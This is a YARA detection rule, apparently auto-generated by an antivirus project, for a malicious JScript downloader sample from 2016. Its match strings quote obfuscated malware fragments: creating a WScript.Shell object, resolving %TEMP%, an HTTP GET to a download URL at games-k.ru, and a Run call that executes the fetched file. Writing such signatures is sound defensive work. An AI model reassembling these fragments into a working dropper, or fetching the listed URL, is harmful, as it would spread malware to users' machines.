rule sig_20160427_ae82d061da3be7d20a8c7db5c9c14f26 {
  meta:
    description = "datamaliciousorder - file 20160427_ae82d061da3be7d20a8c7db5c9c14f26.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f9c5be688ce00bd38e9224d079b30b9262354db1afff0575e2b69d4eba531916"

  strings:
    $s1  = "function BbjmsMeqas() {return ShgmjQvbem[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rgOCN58" ascii
    $s2  = "function BbjmsMeqas() {return ShgmjQvbem[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rgOCN58" ascii
    $s3  = "function TckxqDotjl(ZemghWmebt, ZzhieNkqzk){UfhgxGlvis = UfhgxGlvis * 1; return ZemghWmebt - ZzhieNkqzk;};" fullword ascii
    $s4  = "var ShgmjQvbem = function HnfeiDtnba() {return SmiqpNeiiq[HjjgpZzwph](\"WScript\"+\".Shell\");}(), CeqawTbkwr = 11;" fullword ascii
    $s5  = "WsuojAmwyl[QhrnmAsgkh](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var SmiqpNeiiq = this[\"WScript\"];" fullword ascii
    $s7  = "if (WsuojAmwyl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function BnivdXyqto(){return DrozyKlqjb + \"\";};" fullword ascii
    $s9  = "function TljpdYeuqp() {return ((WforcJfqvf == true) && (WforcJfqvf == DrtvhRzlrt)) ? 1 : UfhgxGlvis;};" fullword ascii
    $s10 = "function RwiopQlakr(ZldqhVyvdc) {var OtcveRbfuz = (1, 2, 3, 4, 5, ZldqhVyvdc); return OtcveRbfuz;};" fullword ascii
    $s11 = "function BiemlCijuq(CtusxHivbg){ShgmjQvbem[\"R\"+\"un\"](CtusxHivbg, UfhgxGlvis, UfhgxGlvis);};" fullword ascii
    $s12 = "function VwytzLueve(){return 23;};" fullword ascii
    $s13 = "var DrtvhRzlrt = false;" fullword ascii
    $s14 = "var KlliwUprwf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "DrtvhRzlrt = true; " fullword ascii
    $s16 = "function HkdrzHdxyz(){return HjjgpZzwph;};" fullword ascii
    $s17 = "function OmezvYuorq()" fullword ascii
    $s18 = "var WforcJfqvf = false;" fullword ascii
    $s19 = "return TckxqDotjl(OsxaeTltjq, JkmrgJuhbh);" fullword ascii
    $s20 = "WforcJfqvf = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}